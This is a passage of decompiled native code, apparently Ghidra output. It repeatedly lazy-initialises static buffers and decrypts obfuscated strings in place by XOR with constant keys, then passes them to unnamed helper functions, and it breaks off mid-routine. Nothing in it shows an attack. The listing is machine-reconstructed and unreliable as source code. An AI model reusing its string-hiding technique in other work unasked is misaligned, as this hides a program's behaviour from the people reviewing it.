      *puVar14 = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ (byte)((ulong)uVar12 >> 0x38),
                          CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ (byte)((ulong)uVar12 >> 0x30),
                                   CONCAT15((byte)((ulong)uVar35 >> 0x28) ^
                                            (byte)((ulong)uVar12 >> 0x28),
                                            CONCAT14((byte)((ulong)uVar35 >> 0x20) ^
                                                     (byte)((ulong)uVar12 >> 0x20),
                                                     CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                              (byte)((ulong)uVar12 >> 0x18),
                                                              CONCAT12((byte)((ulong)uVar35 >> 0x10)
                                                                       ^ (byte)((ulong)uVar12 >>
                                                                               0x10),
                                                                       CONCAT11((byte)((ulong)uVar35
                                                                                      >> 8) ^
                                                                                (byte)((ulong)uVar12
                                                                                      >> 8),
                                                                                (byte)uVar35 ^
                                                                                (byte)uVar12)))))));
      *(byte *)((long)puVar14 + 0xd) = *(byte *)((long)puVar14 + 0xd) ^ 0xa9;
      *(byte *)((long)puVar14 + 0xe) = *(byte *)((long)puVar14 + 0xe) ^ 0xf7;
    }
    uVar12 = FUN_002295c4(&DAT_00233e70);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233ed0);
    if ((*pbVar11 & 1) == 0) {
      uVar12 = FUN_002295c4(&DAT_00233eb0);
      FUN_001a8858(uVar12,&DAT_00177ecf);
      FUN_002234c0(&LAB_001a8a4c,uVar12,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233ed0);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233eb0);
      cVar2 = *(char *)(lVar13 + 0x3d);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233eb0);
      cVar2 = *(char *)(lVar13 + 0x3d);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233eb0);
      uVar35 = _UNK_00177028;
      uVar12 = _DAT_00177020;
      *(byte *)(puVar14 + 6) = *(byte *)(puVar14 + 6) ^ 99;
      *(byte *)((long)puVar14 + 0x31) = *(byte *)((long)puVar14 + 0x31) ^ 0x2d;
      uVar40 = puVar14[5];
      uVar39 = puVar14[4];
      *(byte *)((long)puVar14 + 0x32) = *(byte *)((long)puVar14 + 0x32) ^ 0x4b;
      *(byte *)((long)puVar14 + 0x33) = *(byte *)((long)puVar14 + 0x33) ^ 0xa5;
      *(byte *)((long)puVar14 + 0x34) = *(byte *)((long)puVar14 + 0x34) ^ 0x95;
      *(byte *)((long)puVar14 + 0x35) = *(byte *)((long)puVar14 + 0x35) ^ 0x2d;
      uVar36 = puVar14[1];
      uVar34 = *puVar14;
      uVar38 = puVar14[3];
      uVar37 = puVar14[2];
      *(byte *)((long)puVar14 + 0x36) = *(byte *)((long)puVar14 + 0x36) ^ 0xbf;
      *(undefined1 *)((long)puVar14 + 0x3d) = 0;
      *(byte *)((long)puVar14 + 0x37) = *(byte *)((long)puVar14 + 0x37) ^ 0xe7;
      *(byte *)(puVar14 + 7) = *(byte *)(puVar14 + 7) ^ 99;
      bVar18 = (byte)uVar12;
      bVar19 = (byte)((ulong)uVar12 >> 8);
      bVar20 = (byte)((ulong)uVar12 >> 0x10);
      bVar21 = (byte)((ulong)uVar12 >> 0x18);
      bVar22 = (byte)((ulong)uVar12 >> 0x20);
      bVar23 = (byte)((ulong)uVar12 >> 0x28);
      bVar24 = (byte)((ulong)uVar12 >> 0x30);
      bVar25 = (byte)((ulong)uVar12 >> 0x38);
      bVar26 = (byte)uVar35;
      bVar27 = (byte)((ulong)uVar35 >> 8);
      bVar28 = (byte)((ulong)uVar35 >> 0x10);
      bVar29 = (byte)((ulong)uVar35 >> 0x18);
      bVar30 = (byte)((ulong)uVar35 >> 0x20);
      bVar31 = (byte)((ulong)uVar35 >> 0x28);
      bVar32 = (byte)((ulong)uVar35 >> 0x30);
      bVar33 = (byte)((ulong)uVar35 >> 0x38);
      *(byte *)((long)puVar14 + 0x39) = *(byte *)((long)puVar14 + 0x39) ^ 0x2d;
      *(byte *)((long)puVar14 + 0x3a) = *(byte *)((long)puVar14 + 0x3a) ^ 0x4b;
      puVar14[1] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar36 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar36
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar36 >> 8) ^ bVar27,
                                                  (byte)uVar36 ^ bVar26)))))));
      *puVar14 = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar34 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ bVar18)))))))
      ;
      puVar14[3] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar38 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar38
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar38 >> 8) ^ bVar27,
                                                  (byte)uVar38 ^ bVar26)))))));
      puVar14[2] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar37
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar37 >> 8) ^ bVar19,
                                                  (byte)uVar37 ^ bVar18)))))));
      puVar14[5] = CONCAT17((byte)((ulong)uVar40 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar40 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar40 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar40 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar40 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar40
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar40 >> 8) ^ bVar27,
                                                  (byte)uVar40 ^ bVar26)))))));
      puVar14[4] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar39 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar39
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar39 >> 8) ^ bVar19,
                                                  (byte)uVar39 ^ bVar18)))))));
      *(byte *)((long)puVar14 + 0x3b) = *(byte *)((long)puVar14 + 0x3b) ^ 0xa5;
      *(byte *)((long)puVar14 + 0x3c) = *(byte *)((long)puVar14 + 0x3c) ^ 0x95;
    }
    uVar12 = FUN_002295c4(&DAT_00233eb0);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233f10);
    if ((*pbVar11 & 1) == 0) {
      uVar12 = FUN_002295c4(&DAT_00233ef0);
      FUN_001a8a60(uVar12,&DAT_00177f0c);
      FUN_002234c0(&LAB_001a8ccc,uVar12,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233f10);
      *puVar16 = 1;
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233ef0);
      cVar2 = *(char *)((long)puVar14 + 0x4c);
    }
    else {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233ef0);
      cVar2 = *(char *)((long)puVar14 + 0x4c);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233ef0);
      uVar35 = _UNK_00177568;
      uVar12 = _DAT_00177560;
      *(byte *)((long)puVar14 + 0x41) = *(byte *)((long)puVar14 + 0x41) ^ 0x2f;
      *(byte *)((long)puVar14 + 0x42) = *(byte *)((long)puVar14 + 0x42) ^ 0x81;
      *(undefined1 *)((long)puVar14 + 0x4c) = 0;
      *(byte *)(puVar14 + 8) = *(byte *)(puVar14 + 8) ^ 0xa5;
      uVar36 = puVar14[1];
      uVar34 = *puVar14;
      uVar38 = puVar14[3];
      uVar37 = puVar14[2];
      *(byte *)((long)puVar14 + 0x43) = *(byte *)((long)puVar14 + 0x43) ^ 0x89;
      *(byte *)((long)puVar14 + 0x44) = *(byte *)((long)puVar14 + 0x44) ^ 0x3f;
      *(byte *)((long)puVar14 + 0x45) = *(byte *)((long)puVar14 + 0x45) ^ 0xfd;
      bVar18 = (byte)uVar12;
      bVar19 = (byte)((ulong)uVar12 >> 8);
      bVar20 = (byte)((ulong)uVar12 >> 0x10);
      bVar21 = (byte)((ulong)uVar12 >> 0x18);
      bVar22 = (byte)((ulong)uVar12 >> 0x20);
      bVar23 = (byte)((ulong)uVar12 >> 0x28);
      bVar24 = (byte)((ulong)uVar12 >> 0x30);
      bVar25 = (byte)((ulong)uVar12 >> 0x38);
      bVar26 = (byte)uVar35;
      bVar27 = (byte)((ulong)uVar35 >> 8);
      bVar28 = (byte)((ulong)uVar35 >> 0x10);
      bVar29 = (byte)((ulong)uVar35 >> 0x18);
      bVar30 = (byte)((ulong)uVar35 >> 0x20);
      bVar31 = (byte)((ulong)uVar35 >> 0x28);
      bVar32 = (byte)((ulong)uVar35 >> 0x30);
      bVar33 = (byte)((ulong)uVar35 >> 0x38);
      uVar35 = puVar14[5];
      uVar12 = puVar14[4];
      uVar40 = puVar14[7];
      uVar39 = puVar14[6];
      *(byte *)((long)puVar14 + 0x46) = *(byte *)((long)puVar14 + 0x46) ^ 0xed;
      *(byte *)((long)puVar14 + 0x47) = *(byte *)((long)puVar14 + 0x47) ^ 0x49;
      puVar14[1] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar36 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar36
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar36 >> 8) ^ bVar27,
                                                  (byte)uVar36 ^ bVar26)))))));
      *puVar14 = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar34 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ bVar18)))))))
      ;
      puVar14[3] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar38 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar38
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar38 >> 8) ^ bVar27,
                                                  (byte)uVar38 ^ bVar26)))))));
      puVar14[2] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar37
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar37 >> 8) ^ bVar19,
                                                  (byte)uVar37 ^ bVar18)))))));
      *(byte *)(puVar14 + 9) = *(byte *)(puVar14 + 9) ^ 0xa5;
      *(byte *)((long)puVar14 + 0x49) = *(byte *)((long)puVar14 + 0x49) ^ 0x2f;
      puVar14[5] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar35
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar35 >> 8) ^ bVar27,
                                                  (byte)uVar35 ^ bVar26)))))));
      puVar14[4] = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar12
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar12 >> 8) ^ bVar19,
                                                  (byte)uVar12 ^ bVar18)))))));
      puVar14[7] = CONCAT17((byte)((ulong)uVar40 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar40 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar40 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar40 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar40 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar40
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar40 >> 8) ^ bVar27,
                                                  (byte)uVar40 ^ bVar26)))))));
      puVar14[6] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar39 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar39
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar39 >> 8) ^ bVar19,
                                                  (byte)uVar39 ^ bVar18)))))));
      *(byte *)((long)puVar14 + 0x4a) = *(byte *)((long)puVar14 + 0x4a) ^ 0x81;
      *(byte *)((long)puVar14 + 0x4b) = *(byte *)((long)puVar14 + 0x4b) ^ 0x89;
    }
  }
  else {
    *local_a0 = 0;
    local_a8 = 0;
    if (iVar10 < 0xc) goto LAB_0019c110;
LAB_0019c84c:
    local_b8 = (char *)0x0;
    local_c0 = 0;
    local_c8 = 0;
    pbVar11 = (byte *)FUN_002295c4(&DAT_002339d0);
    if ((*pbVar11 & 1) == 0) {
      uVar12 = FUN_002295c4(&DAT_002339b0);
      FUN_001a7e28(uVar12,&DAT_00177db1);
      FUN_002234c0(&LAB_001a80a4,uVar12,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_002339d0);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_002339b0);
      cVar2 = *(char *)(lVar13 + 0x4e);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_002339b0);
      cVar2 = *(char *)(lVar13 + 0x4e);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_002339b0);
      uVar35 = _UNK_00177038;
      uVar12 = _DAT_00177030;
      uVar36 = puVar14[1];
      uVar34 = *puVar14;
      uVar38 = puVar14[3];
      uVar37 = puVar14[2];
      *(undefined1 *)((long)puVar14 + 0x4e) = 0;
      *(byte *)((long)puVar14 + 0x41) = *(byte *)((long)puVar14 + 0x41) ^ 0x3b;
      *(byte *)((long)puVar14 + 0x42) = *(byte *)((long)puVar14 + 0x42) ^ 0x4b;
      *(byte *)(puVar14 + 8) = *(byte *)(puVar14 + 8) ^ 0x87;
      *(byte *)((long)puVar14 + 0x43) = *(byte *)((long)puVar14 + 0x43) ^ 0x6b;
      bVar18 = (byte)uVar12;
      bVar19 = (byte)((ulong)uVar12 >> 8);
      bVar20 = (byte)((ulong)uVar12 >> 0x10);
      bVar21 = (byte)((ulong)uVar12 >> 0x18);
      bVar22 = (byte)((ulong)uVar12 >> 0x20);
      bVar23 = (byte)((ulong)uVar12 >> 0x28);
      bVar24 = (byte)((ulong)uVar12 >> 0x30);
      bVar25 = (byte)((ulong)uVar12 >> 0x38);
      bVar26 = (byte)uVar35;
      bVar27 = (byte)((ulong)uVar35 >> 8);
      bVar28 = (byte)((ulong)uVar35 >> 0x10);
      bVar29 = (byte)((ulong)uVar35 >> 0x18);
      bVar30 = (byte)((ulong)uVar35 >> 0x20);
      bVar31 = (byte)((ulong)uVar35 >> 0x28);
      bVar32 = (byte)((ulong)uVar35 >> 0x30);
      bVar33 = (byte)((ulong)uVar35 >> 0x38);
      *(byte *)((long)puVar14 + 0x44) = *(byte *)((long)puVar14 + 0x44) ^ 0xdb;
      *(byte *)((long)puVar14 + 0x45) = *(byte *)((long)puVar14 + 0x45) ^ 0x4f;
      puVar14[1] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar36 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar36
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar36 >> 8) ^ bVar27,
                                                  (byte)uVar36 ^ bVar26)))))));
      *puVar14 = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar34 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ bVar18)))))))
      ;
      puVar14[3] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar38 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar38
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar38 >> 8) ^ bVar27,
                                                  (byte)uVar38 ^ bVar26)))))));
      puVar14[2] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar37
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar37 >> 8) ^ bVar19,
                                                  (byte)uVar37 ^ bVar18)))))));
      uVar36 = puVar14[5];
      uVar34 = puVar14[4];
      uVar35 = puVar14[7];
      uVar12 = puVar14[6];
      *(byte *)((long)puVar14 + 0x46) = *(byte *)((long)puVar14 + 0x46) ^ 0xb;
      *(byte *)((long)puVar14 + 0x47) = *(byte *)((long)puVar14 + 0x47) ^ 0xcb;
      *(byte *)(puVar14 + 9) = *(byte *)(puVar14 + 9) ^ 0x87;
      *(byte *)((long)puVar14 + 0x49) = *(byte *)((long)puVar14 + 0x49) ^ 0x3b;
      *(byte *)((long)puVar14 + 0x4a) = *(byte *)((long)puVar14 + 0x4a) ^ 0x4b;
      *(byte *)((long)puVar14 + 0x4d) = *(byte *)((long)puVar14 + 0x4d) ^ 0x4f;
      puVar14[5] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar36 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar36
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar36 >> 8) ^ bVar27,
                                                  (byte)uVar36 ^ bVar26)))))));
      puVar14[4] = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar34 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar34
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar34 >> 8) ^ bVar19,
                                                  (byte)uVar34 ^ bVar18)))))));
      puVar14[7] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar35
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar35 >> 8) ^ bVar27,
                                                  (byte)uVar35 ^ bVar26)))))));
      puVar14[6] = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar12
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar12 >> 8) ^ bVar19,
                                                  (byte)uVar12 ^ bVar18)))))));
      *(byte *)((long)puVar14 + 0x4b) = *(byte *)((long)puVar14 + 0x4b) ^ 0x6b;
      *(byte *)((long)puVar14 + 0x4c) = *(byte *)((long)puVar14 + 0x4c) ^ 0xdb;
    }
    uVar12 = FUN_002295c4(&DAT_002339b0);
    FUN_00204d38(&local_c8,uVar12);
    FUN_002046f8(&local_c8,3000,10);
    FUN_002046f8(&local_c8,0x1425,0x41);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233a10);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_002339f0);
      uVar35 = _UNK_00177688;
      uVar12 = _DAT_00177680;
      *(undefined1 *)((long)puVar14 + 0x12) = 1;
      puVar14[1] = uVar35;
      *puVar14 = uVar12;
      *(undefined2 *)(puVar14 + 2) = 0x5fdb;
      FUN_002234c0(&LAB_001a80b8,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233a10);
      *puVar16 = 1;
    }
    uVar12 = FUN_002295c4(&DAT_002339f0);
    FUN_001b56c8();
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233a50);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233a30);
      uVar12 = _DAT_00177150;
      puVar14[1] = _UNK_00177158;
      *puVar14 = uVar12;
      FUN_002234c0(&LAB_001a80c4,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233a50);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233a30);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233a30);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233a30);
      uVar12 = *puVar14;
      *(undefined1 *)((long)puVar14 + 0xf) = 0;
      bVar18 = (byte)DAT_00177a98;
      uVar17 = (ulong)DAT_00177a98 >> 8;
      uVar4 = (ulong)DAT_00177a98 >> 0x10;
      uVar5 = (ulong)DAT_00177a98 >> 0x18;
      uVar6 = (ulong)DAT_00177a98 >> 0x20;
      uVar7 = (ulong)DAT_00177a98 >> 0x28;
      uVar8 = (ulong)DAT_00177a98 >> 0x30;
      uVar9 = (ulong)DAT_00177a98 >> 0x38;
      *(byte *)(puVar14 + 1) = *(byte *)(puVar14 + 1) ^ 0x71;
      *(byte *)((long)puVar14 + 9) = *(byte *)((long)puVar14 + 9) ^ 0xb;
      *(byte *)((long)puVar14 + 10) = *(byte *)((long)puVar14 + 10) ^ 0xc9;
      *(byte *)((long)puVar14 + 0xb) = *(byte *)((long)puVar14 + 0xb) ^ 0xbd;
      *(byte *)((long)puVar14 + 0xc) = *(byte *)((long)puVar14 + 0xc) ^ 0x4d;
      *puVar14 = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ (byte)uVar9,
                          CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ (byte)uVar8,
                                   CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ (byte)uVar7,
                                            CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ (byte)uVar6,
                                                     CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                              (byte)uVar5,
                                                              CONCAT12((byte)((ulong)uVar12 >> 0x10)
                                                                       ^ (byte)uVar4,
                                                                       CONCAT11((byte)((ulong)uVar12
                                                                                      >> 8) ^
                                                                                (byte)uVar17,
                                                                                (byte)uVar12 ^
                                                                                bVar18)))))));
      *(byte *)((long)puVar14 + 0xd) = *(byte *)((long)puVar14 + 0xd) ^ 0xad;
      *(byte *)((long)puVar14 + 0xe) = *(byte *)((long)puVar14 + 0xe) ^ 0x73;
    }
    uVar12 = FUN_002295c4(&DAT_00233a30);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233a90);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233a70);
      uVar12 = _DAT_001771b0;
      puVar14[1] = _UNK_001771b8;
      *puVar14 = uVar12;
      FUN_002234c0(&LAB_001a80d0,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233a90);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233a70);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233a70);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233a70);
      *(undefined1 *)((long)puVar14 + 0xf) = 0;
      uVar12 = DAT_00177960;
      *(byte *)(puVar14 + 1) = *(byte *)(puVar14 + 1) ^ 0x37;
      *(byte *)((long)puVar14 + 9) = *(byte *)((long)puVar14 + 9) ^ 0xfb;
      uVar35 = *puVar14;
